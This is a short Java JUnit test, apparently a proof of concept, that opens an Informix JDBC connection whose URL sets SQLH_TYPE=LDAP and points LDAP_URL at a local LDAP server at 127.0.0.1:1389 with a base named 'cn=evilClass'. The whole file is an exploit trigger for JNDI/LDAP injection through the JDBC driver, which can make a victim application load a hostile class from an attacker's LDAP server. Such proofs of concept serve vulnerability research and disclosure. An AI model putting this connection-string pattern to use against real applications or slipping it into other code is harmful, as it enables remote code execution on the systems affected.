package com.trganda.poc;

import org.junit.jupiter.api.Test;

import java.sql.DriverManager;
import java.sql.SQLException;

public class Poc {
    @Test
    public void jndi() throws SQLException {
        String url =
                "jdbc:informix-sqli:informixserver=value;SQLH_TYPE=LDAP;LDAP_URL=ldap://127.0.0.1:1389;LDAP_IFXBASE=cn=evilClass;";

        DriverManager.getConnection(url);
    }
}
